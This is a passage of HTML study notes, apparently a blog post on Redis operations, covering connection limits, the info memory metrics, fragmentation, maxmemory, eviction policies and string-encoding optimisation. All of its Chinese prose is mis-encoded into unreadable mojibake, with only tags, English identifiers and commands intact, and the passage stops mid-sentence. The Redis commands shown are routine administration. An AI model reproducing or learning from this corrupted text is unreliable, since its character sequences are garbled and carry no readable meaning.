å®ä¾‹è®¾ç½®æœ€å¤§å¯ç”¨å†…å­˜(maxmemory)</li><li>é™ä½ç³»ç»Ÿä½¿ç”¨swapä¼˜å…ˆçº§ï¼Œå¦‚<code>echo10&gt;/proc/sys/vm/swappiness</code></li></ul><h3 id="ç½‘ç»œé—®é¢˜"><a href="#ç½‘ç»œé—®é¢˜" class="headerlink" title="ç½‘ç»œé—®é¢˜"></a>ç½‘ç»œé—®é¢˜</h3><p>Redisè¿æ¥æ‹’ç»ï¼šRedisé€šè¿‡maxclientså‚æ•°æ§åˆ¶å®¢æˆ·ç«¯æœ€å¤§è¿æ¥æ•°ï¼Œé»˜è®¤10000ã€‚å½“Redisè¿æ¥æ•°å¤§äº<code>maxclients</code>æ—¶ä¼šæ‹’ç»æ–°çš„è¿æ¥è¿›å…¥ï¼Œ<code>info stats</code>çš„<code>rejected_connections</code>ç»Ÿè®¡æŒ‡æ ‡è®°å½•æ‰€æœ‰è¢«æ‹’ç»è¿æ¥çš„æ•°é‡ã€‚å®¢æˆ·ç«¯è®¿é—®Redisæ—¶å°½é‡é‡‡ç”¨NIOé•¿è¿æ¥æˆ–è€…è¿æ¥æ± çš„æ–¹å¼ã€‚Redis é»˜è®¤ä¸ä¼šä¸»åŠ¨å…³é—­é•¿æ—¶é—´é—²ç½®è¿æ¥æˆ–æ£€æŸ¥å…³é—­æ— æ•ˆçš„TCPè¿æ¥ï¼Œå› æ­¤ä¼šå¯¼è‡´Redisè¿æ¥æ•°å¿«é€Ÿæ¶ˆè€—ä¸”æ— æ³•é‡Šæ”¾çš„é—®é¢˜ï¼Œæ­¤æ—¶å¯è®¾ç½®<code>tcp-keepalive</code>å’Œ<code>timeout</code>å‚æ•°è®©Redisä¸»åŠ¨æ£€æŸ¥å’Œå…³é—­æ— æ•ˆè¿æ¥ã€‚</p><p>è¿æ¥æº¢å‡ºï¼šOS ä¸€èˆ¬ä¼šå¯¹è¿›ç¨‹ä½¿ç”¨çš„èµ„æºåšé™åˆ¶ï¼Œå…¶ä¸­ä¸€é¡¹æ˜¯å¯¹è¿›ç¨‹å¯æ‰“å¼€æœ€å¤§æ–‡ä»¶æ•°æ§åˆ¶ï¼Œé»˜è®¤ 1024ï¼Œå¯¹éœ€è¦æ”¯æ’‘é«˜å¹¶å‘çš„ Redis éœ€è¦è°ƒå¤§è¯¥é™åˆ¶ã€‚</p><p>å¸¸è§çš„ç‰©ç†æ‹“æ‰‘æŒ‰ç½‘ç»œå»¶è¿Ÿç”±å¿«åˆ°æ…¢å¯åˆ†ä¸ºï¼šåŒç‰©ç†æœº&gt;åŒæœºæ¶&gt;è·¨æœºæ¶&gt;åŒæœºæˆ¿&gt;åŒåŸæœºæˆ¿&gt;å¼‚åœ°æœºæˆ¿ã€‚ä½†å®ƒä»¬å®¹ç¾æ€§æ­£å¥½ç›¸åã€‚</p><h1 id="ç¬¬-8-ç« -ç†è§£å†…å­˜"><a href="#ç¬¬-8-ç« -ç†è§£å†…å­˜" class="headerlink" title="ç¬¬ 8 ç«  ç†è§£å†…å­˜"></a>ç¬¬ 8 ç«  ç†è§£å†…å­˜</h1><p>å†…å­˜æ¶ˆè€—å¯ä»¥åˆ†ä¸ºè¿›ç¨‹è‡ªèº«æ¶ˆè€—å’Œå­è¿›ç¨‹æ¶ˆè€—ã€‚</p><h2 id="å†…å­˜æ¶ˆè€—"><a href="#å†…å­˜æ¶ˆè€—" class="headerlink" title="å†…å­˜æ¶ˆè€—"></a>å†…å­˜æ¶ˆè€—</h2><h3 id="å†…å­˜æ¶ˆè€—ç»Ÿè®¡"><a href="#å†…å­˜æ¶ˆè€—ç»Ÿè®¡" class="headerlink" title="å†…å­˜æ¶ˆè€—ç»Ÿè®¡"></a>å†…å­˜æ¶ˆè€—ç»Ÿè®¡</h3><p>é€šè¿‡<code>info memory</code>å‘½ä»¤è·å–å†…å­˜ç›¸å…³æŒ‡æ ‡ï¼ŒæŒ‡æ ‡è¯´æ˜å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>å±æ€§å</th><th>å±æ€§è¯´æ˜</th></tr></thead><tbody><tr><td><code>used_memory</code></td><td>Redisåˆ†é…å™¨åˆ†é…çš„å†…å­˜æ€»é‡ï¼Œä¹Ÿå°±æ˜¯å†…éƒ¨å­˜å‚¨çš„æ‰€æœ‰æ•°æ®å†…å­˜å ç”¨é‡</td></tr><tr><td><code>used_memory_human</code></td><td>ä»¥å¯è¯»çš„æ ¼å¼è¿”å›<code>used memory</code></td></tr><tr><td><code>used_memory_rss</code></td><td>ä»æ“ä½œç³»ç»Ÿçš„è§’åº¦æ˜¾ç¤ºRedisè¿›ç¨‹å ç”¨çš„ç‰©ç†å†…å­˜æ€»é‡</td></tr><tr><td><code>used_memory_peak</code></td><td>å†…å­˜ä½¿ç”¨çš„æœ€å¤§å€¼ï¼Œè¡¨ç¤º<code>used memory</code>çš„å³°å€¼</td></tr><tr><td><code>used_memory_peak_human</code></td><td>ä»¥å¯è¯»çš„æ ¼å¼è¿”å›<code>used_memory_peak</code></td></tr><tr><td><code>used_memory_lua</code></td><td>Lua å¼•æ“æ‰€æ¶ˆè€—çš„å†…å­˜å¤§å°</td></tr><tr><td><code>mem_fragmentation_ratio</code></td><td><code>used_memory_rss/used_memory</code>æ¯”å€¼ï¼Œè¡¨ç¤ºå†…å­˜ç¢ç‰‡ç‡</td></tr><tr><td><code>mem_allocator</code></td><td>Redis æ‰€ä½¿ç”¨çš„å†…å­˜åˆ†é…å™¨ï¼Œé»˜è®¤ä¸º jemalloc</td></tr></tbody></table><p>å½“<code>mem_fragmentation_ratio &gt; 1</code>æ—¶ï¼Œè¯´æ˜<code>used_memory_rss-used_memory</code>å¤šå‡ºçš„éƒ¨åˆ†å†…å­˜å¹¶æ²¡æœ‰ç”¨äºæ•°æ®å­˜å‚¨ï¼Œè€Œæ˜¯è¢«å†…å­˜ç¢ç‰‡æ‰€æ¶ˆè€—ï¼Œå¦‚æœä¸¤è€…ç›¸å·®å¾ˆå¤§ï¼Œè¯´æ˜ç¢ç‰‡ç‡ä¸¥é‡ã€‚<br>å½“<code>mem_fragmentation_ratio &lt; 1</code>æ—¶ï¼Œè¿™ç§æƒ…å†µä¸€èˆ¬å‡ºç°åœ¨æ“ä½œç³»ç»ŸæŠŠRediså†…å­˜äº¤æ¢ï¼ˆSwapï¼‰åˆ°ç¡¬ç›˜å¯¼è‡´ï¼Œå‡ºç°è¿™ç§æƒ…å†µæ—¶è¦æ ¼å¤–å…³æ³¨ï¼Œç”±äºç¡¬ç›˜é€Ÿåº¦è¿œè¿œæ…¢äºå†…å­˜ï¼ŒRedisæ€§èƒ½ä¼šå˜å¾—å¾ˆå·®ï¼Œç”šè‡³åƒµæ­»ã€‚</p><h3 id="å†…å­˜æ¶ˆè€—åˆ’åˆ†"><a href="#å†…å­˜æ¶ˆè€—åˆ’åˆ†" class="headerlink" title="å†…å­˜æ¶ˆè€—åˆ’åˆ†"></a>å†…å­˜æ¶ˆè€—åˆ’åˆ†</h3><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g94c4oj8s0j30y20mmtfb.jpg" alt=""></p><p>å†…å­˜ç¢ç‰‡é—®é¢˜è™½ç„¶æ˜¯æ‰€æœ‰å†…å­˜æœåŠ¡çš„é€šç—…ï¼Œä½†æ˜¯jemallocé’ˆå¯¹ç¢ç‰‡åŒ–é—®é¢˜ä¸“é—¨åšäº†ä¼˜åŒ–ï¼Œä¸€èˆ¬ä¸ä¼šå­˜åœ¨è¿‡åº¦ç¢ç‰‡åŒ–çš„é—®é¢˜ï¼Œæ­£å¸¸çš„ç¢ç‰‡ç‡ï¼ˆ<code>mem_fragmentation_ratio</code>ï¼‰åœ¨1.03å·¦å³ã€‚ä½†æ˜¯å½“å­˜å‚¨çš„æ•°æ®é•¿çŸ­å·®å¼‚è¾ƒå¤§æ—¶ï¼Œä»¥ä¸‹åœºæ™¯å®¹æ˜“å‡ºç°é«˜å†…å­˜ç¢ç‰‡é—®é¢˜ï¼š</p><ul><li>é¢‘ç¹åšæ›´æ–°æ“ä½œï¼Œä¾‹å¦‚é¢‘ç¹å¯¹å·²å­˜åœ¨çš„é”®æ‰§è¡Œ<code>append</code>ã€<code>setrange</code>ç­‰æ›´æ–°æ“ä½œã€‚</li><li>å¤§é‡è¿‡æœŸé”®åˆ é™¤ï¼Œé”®å¯¹è±¡è¿‡æœŸåˆ é™¤åï¼Œé‡Šæ”¾çš„ç©ºé—´æ— æ³•å¾—åˆ°å……åˆ†åˆ©ç”¨ï¼Œå¯¼è‡´ç¢ç‰‡ç‡ä¸Šå‡ã€‚</li></ul><p>å‡ºç°é«˜å†…å­˜ç¢ç‰‡é—®é¢˜æ—¶å¸¸è§çš„è§£å†³æ–¹å¼å¦‚ä¸‹ï¼š</p><ul><li>æ•°æ®å¯¹é½ï¼šåœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹å°½é‡åšæ•°æ®å¯¹é½ï¼Œæ¯”å¦‚æ•°æ®å°½é‡é‡‡ç”¨æ•°å­—ç±»å‹æˆ–è€…å›ºå®šé•¿åº¦å­—ç¬¦ä¸²ç­‰ï¼Œä½†æ˜¯è¿™è¦è§†å…·ä½“çš„ä¸šåŠ¡è€Œå®šï¼Œæœ‰äº›åœºæ™¯æ— æ³•åšåˆ°ã€‚</li><li>å®‰å…¨é‡å¯ï¼šé‡å¯èŠ‚ç‚¹å¯ä»¥åšåˆ°å†…å­˜ç¢ç‰‡é‡æ–°æ•´ç†ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨é«˜å¯ç”¨æ¶æ„ï¼Œå¦‚Sentinelæˆ–Clusterï¼Œå°†ç¢ç‰‡ç‡è¿‡é«˜çš„ä¸»èŠ‚ç‚¹è½¬æ¢ä¸ºä»èŠ‚ç‚¹ï¼Œè¿›è¡Œå®‰å…¨é‡å¯ã€‚</li></ul><h3 id="å­è¿›ç¨‹å†…å­˜æ¶ˆè€—"><a href="#å­è¿›ç¨‹å†…å­˜æ¶ˆè€—" class="headerlink" title="å­è¿›ç¨‹å†…å­˜æ¶ˆè€—"></a>å­è¿›ç¨‹å†…å­˜æ¶ˆè€—</h3><ul><li>Redisäº§ç”Ÿçš„å­è¿›ç¨‹å¹¶ä¸éœ€è¦æ¶ˆè€—1å€çš„çˆ¶è¿›ç¨‹å†…å­˜ï¼Œå®é™…æ¶ˆè€—æ ¹æ®æœŸé—´å†™å…¥å‘½ä»¤é‡å†³å®šï¼Œä½†æ˜¯ä¾ç„¶è¦é¢„ç•™å‡ºä¸€äº›å†…å­˜é˜²æ­¢æº¢å‡ºã€‚</li><li>éœ€è¦è®¾ç½®<code>sysctl vm.overcommit_memory = 1</code>å…è®¸å†…æ ¸å¯ä»¥åˆ†é…æ‰€æœ‰çš„ç‰©ç†å†…å­˜ï¼Œé˜²æ­¢Redisè¿›ç¨‹æ‰§è¡Œforkæ—¶å› ç³»ç»Ÿå‰©ä½™å†…å­˜ä¸è¶³è€Œå¤±è´¥ã€‚</li><li>æ’æŸ¥å½“å‰ç³»ç»Ÿæ˜¯å¦æ”¯æŒå¹¶å¼€å¯THPï¼Œå¦‚æœå¼€å¯ï¼Œå»ºè®®å…³é—­ï¼Œé˜²æ­¢<code>copy-onwrite</code>æœŸé—´å†…å­˜è¿‡åº¦æ¶ˆè€—ã€‚å¦‚æœåœ¨é«˜å¹¶å‘å†™çš„åœºæ™¯ä¸‹å¼€å¯THPï¼Œå­è¿›ç¨‹å†…å­˜æ¶ˆè€—å¯èƒ½æ˜¯çˆ¶è¿›ç¨‹çš„æ•°å€ï¼Œææ˜“é€ æˆæœºå™¨ç‰©ç†å†…å­˜æº¢å‡ºï¼Œä»è€Œè§¦å‘SWAPæˆ–OOM killerã€‚</li></ul><h2 id="å†…å­˜ç®¡ç†"><a href="#å†…å­˜ç®¡ç†" class="headerlink" title="å†…å­˜ç®¡ç†"></a>å†…å­˜ç®¡ç†</h2><p>Redisä¸»è¦é€šè¿‡æ§åˆ¶å†…å­˜ä¸Šé™å’Œå›æ”¶ç­–ç•¥å®ç°å†…å­˜ç®¡ç†ã€‚</p><h3 id="è®¾ç½®å†…å­˜ä¸Šé™"><a href="#è®¾ç½®å†…å­˜ä¸Šé™" class="headerlink" title="è®¾ç½®å†…å­˜ä¸Šé™"></a>è®¾ç½®å†…å­˜ä¸Šé™</h3><p>Redisä½¿ç”¨<code>maxmemory</code>å‚æ•°é™åˆ¶æœ€å¤§å¯ç”¨å†…å­˜ã€‚éœ€è¦æ³¨æ„ï¼Œ<code>maxmemory</code>é™åˆ¶çš„æ˜¯Rediså®é™…ä½¿ç”¨çš„å†…å­˜é‡ï¼Œä¹Ÿå°±æ˜¯<code>used_memory</code>ç»Ÿè®¡é¡¹å¯¹åº”çš„å†…å­˜ã€‚ç”±äºå†…å­˜ç¢ç‰‡ç‡çš„å­˜åœ¨ï¼Œå®é™…æ¶ˆè€—çš„å†…å­˜å¯èƒ½ä¼šæ¯”<code>maxmemory</code>è®¾ç½®çš„æ›´å¤§ï¼Œå®é™…ä½¿ç”¨æ—¶è¦å°å¿ƒè¿™éƒ¨åˆ†å†…å­˜æº¢å‡ºã€‚é€šè¿‡è®¾ç½®å†…å­˜ä¸Šé™å¯ä»¥éå¸¸æ–¹ä¾¿åœ°å®ç°ä¸€å°æœåŠ¡å™¨éƒ¨ç½²å¤šä¸ªRedisè¿›ç¨‹çš„å†…å­˜æ§åˆ¶ã€‚æ¯”å¦‚ä¸€å°24GBå†…å­˜çš„æœåŠ¡å™¨ï¼Œä¸ºç³»ç»Ÿé¢„ç•™4GBå†…å­˜ï¼Œé¢„ç•™4GBç©ºé—²å†…å­˜ç»™å…¶ä»–è¿›ç¨‹æˆ–Redis forkè¿›ç¨‹ï¼Œç•™ç»™Redis16GBå†…å­˜ï¼Œè¿™æ ·å¯ä»¥éƒ¨ç½²4ä¸ª<code>maxmemory=4GB</code>çš„Redisè¿›ç¨‹ã€‚å¾—ç›ŠäºRediså•çº¿ç¨‹æ¶æ„å’Œå†…å­˜é™åˆ¶æœºåˆ¶ï¼Œå³ä½¿æ²¡æœ‰é‡‡ç”¨è™šæ‹ŸåŒ–ï¼Œä¸åŒçš„Redisè¿›ç¨‹ä¹‹é—´ä¹Ÿå¯ä»¥å¾ˆå¥½åœ°å®ç°CPUå’Œå†…å­˜çš„éš”ç¦»æ€§ï¼Œ</p><h3 id="åŠ¨æ€è°ƒæ•´å†…å­˜ä¸Šé™"><a href="#åŠ¨æ€è°ƒæ•´å†…å­˜ä¸Šé™" class="headerlink" title="åŠ¨æ€è°ƒæ•´å†…å­˜ä¸Šé™"></a>åŠ¨æ€è°ƒæ•´å†…å­˜ä¸Šé™</h3><p>Redisçš„å†…å­˜ä¸Šé™å¯ä»¥é€šè¿‡<code>config set maxmemory</code>è¿›è¡ŒåŠ¨æ€ä¿®æ”¹ã€‚è¯¥æ–¹å¼è¿‡äºç®€å•ï¼Œæ¨èä½¿ç”¨å“¨å…µæˆ–è€…é›†ç¾¤æ¥å¤„ç†ã€‚</p><p>Redisé»˜è®¤æ— é™ä½¿ç”¨æœåŠ¡å™¨å†…å­˜ï¼Œä¸ºé˜²æ­¢æç«¯æƒ…å†µä¸‹å¯¼è‡´ç³»ç»Ÿå†…å­˜è€—å°½ï¼Œå»ºè®®æ‰€æœ‰çš„Redisè¿›ç¨‹éƒ½è¦é…ç½®<code>maxmemory</code>ã€‚</p><h3 id="å†…å­˜å›æ”¶ç­–ç•¥"><a href="#å†…å­˜å›æ”¶ç­–ç•¥" class="headerlink" title="å†…å­˜å›æ”¶ç­–ç•¥"></a>å†…å­˜å›æ”¶ç­–ç•¥</h3><p>Redisçš„å†…å­˜å›æ”¶æœºåˆ¶åˆ†ä¸ºåˆ é™¤è¿‡æœŸçš„é”®å¯¹è±¡ï¼Œä¸å†…å­˜ä½¿ç”¨è¾¾åˆ°maxmemoryä¸Šé™æ—¶è§¦å‘å†…å­˜æº¢å‡ºæ§åˆ¶ç­–ç•¥ã€‚</p><p>Redisæ‰€æœ‰çš„é”®éƒ½å¯ä»¥è®¾ç½®è¿‡æœŸå±æ€§ï¼Œå†…éƒ¨ä¿å­˜åœ¨è¿‡æœŸå­—å…¸ä¸­ã€‚ç”±äºè¿›ç¨‹å†…ä¿å­˜å¤§é‡çš„é”®ï¼Œç»´æŠ¤æ¯ä¸ªé”®ç²¾å‡†çš„è¿‡æœŸåˆ é™¤æœºåˆ¶ä¼šå¯¼è‡´æ¶ˆè€—å¤§é‡çš„CPUï¼Œå¯¹äºå•çº¿ç¨‹çš„Redisæ¥è¯´æˆæœ¬è¿‡é«˜ï¼Œå› æ­¤Redisé‡‡ç”¨æƒ°æ€§åˆ é™¤å’Œå®šæ—¶ä»»åŠ¡åˆ é™¤æœºåˆ¶å®ç°è¿‡æœŸé”®çš„å†…å­˜å›æ”¶ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g94i0a1qirj30u00wg49h.jpg" alt=""></p><p>Redis çš„å†…å­˜æº¢å‡ºæœ‰ 6 ç§æ§åˆ¶ç­–ç•¥ï¼Œå¯é€šè¿‡<code>config set maxmemory-policy {policy}</code>é…ç½®</p><ol><li>noevictionï¼šé»˜è®¤ç­–ç•¥ï¼Œä¸ä¼šåˆ é™¤ä»»ä½•æ•°æ®ï¼Œæ‹’ç»æ‰€æœ‰å†™å…¥æ“ä½œå¹¶è¿”å›å®¢æˆ·ç«¯é”™è¯¯ä¿¡æ¯ï¼ˆerrorï¼‰OOM command not allowed when used memoryï¼Œæ­¤æ—¶Redisåªå“åº”è¯»æ“ä½œã€‚</li><li>volatile-lruï¼šæ ¹æ®LRUç®—æ³•åˆ é™¤è®¾ç½®äº†è¶…æ—¶å±æ€§ï¼ˆexpireï¼‰çš„é”®ï¼Œç›´åˆ°è…¾å‡ºè¶³å¤Ÿç©ºé—´ä¸ºæ­¢ã€‚å¦‚æœæ²¡æœ‰å¯åˆ é™¤çš„é”®å¯¹è±¡ï¼Œå›é€€åˆ°noevictionç­–ç•¥ã€‚</li><li>allkeys-lruï¼šæ ¹æ®LRUç®—æ³•åˆ é™¤é”®ï¼Œä¸ç®¡æ•°æ®æœ‰æ²¡æœ‰è®¾ç½®è¶…æ—¶å±æ€§ï¼Œç›´åˆ°è…¾å‡ºè¶³å¤Ÿç©ºé—´ä¸ºæ­¢ã€‚</li><li>allkeys-randomï¼šéšæœºåˆ é™¤æ‰€æœ‰é”®ï¼Œç›´åˆ°è…¾å‡ºè¶³å¤Ÿç©ºé—´ä¸ºæ­¢ã€‚</li><li>volatile-randomï¼šéšæœºåˆ é™¤è¿‡æœŸé”®ï¼Œç›´åˆ°è…¾å‡ºè¶³å¤Ÿç©ºé—´ä¸ºæ­¢ã€‚</li><li>volatile-ttlï¼šæ ¹æ®é”®å€¼å¯¹è±¡çš„ttlå±æ€§ï¼Œåˆ é™¤æœ€è¿‘å°†è¦è¿‡æœŸæ•°æ®ã€‚å¦‚æœæ²¡æœ‰ï¼Œå›é€€åˆ°noevictionç­–ç•¥ã€‚</li></ol><p>é¢‘ç¹æ‰§è¡Œå›æ”¶å†…å­˜æˆæœ¬å¾ˆé«˜ï¼Œä¼šå¯¼è‡´ Redis çš„æ€§èƒ½ä¸‹é™ï¼Œå¦‚æœå½“å‰Redisæœ‰ä»èŠ‚ç‚¹ï¼Œå›æ”¶å†…å­˜æ“ä½œå¯¹åº”çš„åˆ é™¤å‘½ä»¤ä¼šåŒæ­¥åˆ°ä»èŠ‚ç‚¹ï¼Œå¯¼è‡´å†™æ”¾å¤§çš„é—®é¢˜ã€‚</p><h2 id="å†…å­˜ä¼˜åŒ–"><a href="#å†…å­˜ä¼˜åŒ–" class="headerlink" title="å†…å­˜ä¼˜åŒ–"></a>å†…å­˜ä¼˜åŒ–</h2><h3 id="redisObjectå¯¹è±¡"><a href="#redisObjectå¯¹è±¡" class="headerlink" title="redisObjectå¯¹è±¡"></a>redisObjectå¯¹è±¡</h3><p>Rediså­˜å‚¨çš„æ‰€æœ‰å€¼å¯¹è±¡åœ¨å†…éƒ¨å®šä¹‰ä¸ºredisObjectç»“æ„ä½“ï¼Œå†…éƒ¨ç»“æ„å¦‚å›¾<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g94ig5abpxj30zi0u0tkp.jpg" alt=""></p><p>typeå­—æ®µï¼šè¡¨ç¤ºå½“å‰å¯¹è±¡ä½¿ç”¨çš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨<code>type {key}</code>å‘½ä»¤æŸ¥çœ‹å¯¹è±¡æ‰€å±ç±»å‹<br>encoding å­—æ®µï¼šRediså†…éƒ¨ç¼–ç ç±»å‹<br>lru å­—æ®µï¼šè®°å½•å¯¹è±¡æœ€åä¸€æ¬¡è¢«è®¿é—®çš„æ—¶é—´ï¼Œå½“é…ç½®äº†<code>maxmemory</code>å’Œ<code>maxmemory-policy=volatile-lru</code>æˆ–è€…<code>allkeys-lru</code>æ—¶ï¼Œç”¨äºè¾…åŠ©LRUç®—æ³•åˆ é™¤é”®æ•°æ®ã€‚å¯ä»¥ä½¿ç”¨<code>object idletime {key}</code>å‘½ä»¤åœ¨ä¸æ›´æ–°lruå­—æ®µæƒ…å†µä¸‹æŸ¥çœ‹å½“å‰é”®çš„ç©ºé—²æ—¶é—´ã€‚<br>refcountå­—æ®µï¼šè®°å½•å½“å‰å¯¹è±¡è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼Œç”¨äºé€šè¿‡å¼•ç”¨æ¬¡æ•°å›æ”¶å†…å­˜ï¼Œå½“<code>refcount=0</code>æ—¶ï¼Œå¯ä»¥å®‰å…¨å›æ”¶å½“å‰å¯¹è±¡ç©ºé—´ã€‚<br><code>*ptr</code>å­—æ®µï¼šä¸å¯¹è±¡çš„æ•°æ®å†…å®¹ç›¸å…³ï¼Œå¦‚æœæ˜¯æ•´æ•°ï¼Œç›´æ¥å­˜å‚¨æ•°æ®ï¼›å¦åˆ™è¡¨ç¤ºæŒ‡å‘æ•°æ®çš„æŒ‡é’ˆã€‚Redisåœ¨3.0ä¹‹åå¯¹å€¼å¯¹è±¡æ˜¯å­—ç¬¦ä¸²ä¸”é•¿åº¦&lt;=39å­—èŠ‚çš„æ•°æ®ï¼Œå†…éƒ¨ç¼–ç ä¸º<code>embstr</code>ç±»å‹ï¼Œå­—ç¬¦ä¸²<code>sds</code>å’Œr<code>edisObject</code>ä¸€èµ·åˆ†é…ï¼Œä»è€Œ<strong>åªè¦ä¸€æ¬¡å†…å­˜æ“ä½œå³å¯</strong>ã€‚</p><h3 id="ç¼©å‡é”®å€¼å¯¹è±¡"><a href="#ç¼©å‡é”®å€¼å¯¹è±¡" class="headerlink" title="ç¼©å‡é”®å€¼å¯¹è±¡"></a>ç¼©å‡é”®å€¼å¯¹è±¡</h3><p>é™ä½Rediså†…å­˜ä½¿ç”¨æœ€ç›´æ¥çš„æ–¹å¼å°±æ˜¯ç¼©å‡é”®ï¼ˆkeyï¼‰å’Œå€¼ï¼ˆvalueï¼‰çš„é•¿åº¦ã€‚</p><ul><li>keyé•¿åº¦ï¼šå¦‚åœ¨è®¾è®¡é”®æ—¶ï¼Œåœ¨å®Œæ•´æè¿°ä¸šåŠ¡æƒ…å†µä¸‹ï¼Œé”®å€¼è¶ŠçŸ­è¶Šå¥½ã€‚å¦‚<code>userï¼š{uid}ï¼šfriendsï¼šnotifyï¼š{fid}</code>å¯ä»¥ç®€åŒ–ä¸º<code>uï¼š{uid}ï¼šfsï¼šntï¼š{fid}</code></li><li>valueé•¿åº¦ï¼šå€¼å¯¹è±¡ç¼©å‡æ¯”è¾ƒå¤æ‚ï¼Œå¸¸è§éœ€æ±‚æ˜¯æŠŠä¸šåŠ¡å¯¹è±¡åºåˆ—åŒ–æˆäºŒè¿›åˆ¶æ•°ç»„æ”¾å…¥Redisã€‚é¦–å…ˆåº”è¯¥<strong>åœ¨ä¸šåŠ¡ä¸Šç²¾ç®€ä¸šåŠ¡å¯¹è±¡ï¼Œå»æ‰ä¸å¿…è¦çš„å±æ€§é¿å…å­˜å‚¨æ— æ•ˆæ•°æ®</strong>ã€‚å…¶æ¬¡åœ¨åºåˆ—åŒ–å·¥å…·é€‰æ‹©ä¸Šï¼Œåº”è¯¥<strong>é€‰æ‹©æ›´é«˜æ•ˆçš„åºåˆ—åŒ–å·¥å…·æ¥é™ä½å­—èŠ‚æ•°ç»„å¤§å°</strong>ã€‚å€¼å¯¹è±¡é™¤äº†å­˜å‚¨äºŒè¿›åˆ¶æ•°æ®ä¹‹å¤–ï¼Œé€šå¸¸è¿˜ä¼šä½¿ç”¨é€šç”¨æ ¼å¼å­˜å‚¨æ•°æ®æ¯”å¦‚ï¼šjsonã€xmlç­‰ä½œä¸ºå­—ç¬¦ä¸²å­˜å‚¨åœ¨Redisä¸­ã€‚è¿™ç§æ–¹å¼ä¼˜ç‚¹æ˜¯æ–¹ä¾¿è°ƒè¯•å’Œè·¨è¯­è¨€ï¼Œä½†æ˜¯åŒæ ·çš„æ•°æ®ç›¸æ¯”å­—èŠ‚æ•°ç»„æ‰€éœ€çš„ç©ºé—´æ›´å¤§ï¼Œåœ¨å†…å­˜ç´§å¼ çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨é€šç”¨å‹ç¼©ç®—æ³•å‹ç¼©jsonã€xmlåå†å­˜å…¥Redisï¼Œä»è€Œé™ä½å†…å­˜å ç”¨ï¼Œä¾‹å¦‚ä½¿ç”¨GZIPå‹ç¼©åçš„jsonå¯é™ä½çº¦60%çš„ç©ºé—´ã€‚ï¼ˆå½“é¢‘ç¹å‹ç¼©è§£å‹jsonç­‰æ–‡æœ¬æ•°æ®æ—¶ï¼Œå¼€å‘äººå‘˜éœ€è¦è€ƒè™‘å‹ç¼©é€Ÿåº¦å’Œè®¡ç®—å¼€é”€æˆæœ¬ï¼Œè¿™é‡Œæ¨èä½¿ç”¨Googleçš„Snappyå‹ç¼©å·¥å…·ï¼Œåœ¨ç‰¹å®šçš„å‹ç¼©ç‡æƒ…å†µä¸‹æ•ˆç‡è¿œè¿œé«˜äºGZIPç­‰ä¼ ç»Ÿå‹ç¼©å·¥å…·ï¼Œä¸”æ”¯æŒæ‰€æœ‰ä¸»æµè¯­è¨€ç¯å¢ƒã€‚ï¼‰</li></ul><h3 id="å­—ç¬¦ä¸²ä¼˜åŒ–"><a href="#å­—ç¬¦ä¸²ä¼˜åŒ–" class="headerlink" title="å­—ç¬¦ä¸²ä¼˜åŒ–"></a>å­—ç¬¦ä¸²ä¼˜åŒ–</h3><p>Redisæ²¡æœ‰é‡‡ç”¨åŸç”ŸCè¯­è¨€çš„å­—ç¬¦ä¸²ç±»å‹è€Œæ˜¯è‡ªå·±å®ç°äº†å­—ç¬¦ä¸²ç»“æ„ï¼Œå†…éƒ¨ç®€å•åŠ¨æ€å­—ç¬¦ä¸²ï¼ˆsimple dynamic stringï¼ŒSDSï¼‰ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g97yccw87dj30kt0dq0w8.jpg" alt=""></p><p>Redisè‡ªèº«å®ç°çš„å­—ç¬¦ä¸²ç»“æ„æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li>$O(1)$æ—¶é—´å¤æ‚åº¦è·å–ï¼šå­—ç¬¦ä¸²é•¿åº¦ã€å·²ç”¨é•¿åº¦ã€æœªç”¨é•¿åº¦ã€‚</li><li>å¯ç”¨äºä¿å­˜å­—èŠ‚æ•°ç»„ï¼Œæ”¯æŒå®‰å…¨çš„äºŒè¿›åˆ¶æ•°æ®å­˜å‚¨ã€‚</li><li>å†…éƒ¨å®ç°ç©ºé—´é¢„åˆ†é…æœºåˆ¶ï¼Œé™ä½å†…å­˜å†åˆ†é…æ¬¡æ•°ã€‚</li><li>æƒ°æ€§åˆ é™¤æœºåˆ¶ï¼Œå­—ç¬¦ä¸²ç¼©å‡åçš„ç©ºé—´ä¸é‡Šæ”¾ï¼Œä½œä¸ºé¢„åˆ†é…ç©ºé—´ä¿ç•™ã€‚</li></ul><p>å­—ç¬¦ä¸²ä¹‹æ‰€ä»¥é‡‡ç”¨é¢„åˆ†é…çš„æ–¹å¼æ˜¯é˜²æ­¢ä¿®æ”¹æ“ä½œéœ€è¦ä¸æ–­é‡åˆ†é…å†…å­˜å’Œå­—èŠ‚æ•°æ®æ‹·è´ã€‚ä½†åŒæ ·ä¹Ÿä¼šé€ æˆå†…å­˜çš„æµªè´¹ã€‚æˆ‘ä»¬éœ€è¦å°½é‡å‡å°‘å­—ç¬¦ä¸²é¢‘ç¹ä¿®æ”¹æ“ä½œå¦‚<code>append</code>ã€<code>setrange</code>å¯èƒ½å¯¼è‡´çš„é¢„åˆ†é…å®¹é‡ç¿»å€ï¼ˆå†…å­˜ç¢ç‰‡ç‡ä¸Šå‡ï¼‰çš„é—®é¢˜ã€‚</p><p>å­—ç¬¦ä¸²é‡æ„ï¼šæŒ‡<strong>ä¸ä¸€å®šæŠŠæ¯ä»½æ•°æ®ä½œä¸ºå­—ç¬¦ä¸²æ•´ä½“å­˜å‚¨ï¼Œåƒjsonè¿™æ 